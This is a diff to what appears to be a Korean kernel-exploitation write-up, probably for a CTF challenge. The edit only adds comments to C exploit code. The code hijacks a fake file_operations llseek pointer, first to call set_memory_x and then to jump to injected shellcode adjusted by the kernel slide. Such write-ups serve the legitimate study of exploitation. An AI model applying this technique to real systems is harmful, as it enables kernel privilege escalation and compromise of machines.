@@ -127,12 +127,12 @@ __int64 __fastcall my_write(__int64 filp, __int64 usr_buf, unsigned __int64 size
     
     ```c
     // 쉘코드 영역을 실행 가능한 상태로 조작
-    file_ax[0x108 >> 3] = 0x107b800L + kernel_slide; // set_memory_x 함수 주소
+    file_ax[0x108 >> 3] = 0x107b800L + kernel_slide; // f_op->llseek 포인터를 set_memory_x 주소로 조작
     file_ax[0xb0 >> 3] = file_base + 0x100L; // 가짜 fops 주소 설정
     lseek(findfd, 1, SEEK_SET);
     
     // 쉘코드를 실행하도록 조작
-    file_ax[0x108 >> 3] = file_base + 0x110L;
+    file_ax[0x108 >> 3] = file_base + 0x110L; // f_op->llseek 포인터를 쉘코드 영역으로 조작
     memcpy(&file_ax[0x110 >> 3], shellcode, sizeof(shellcode));
     memcpy((char *)&file_ax[0x110 >> 3] + sizeof(shellcode) - 9, &kernel_slide, 8);
     lseek(findfd, 1, SEEK_SET);
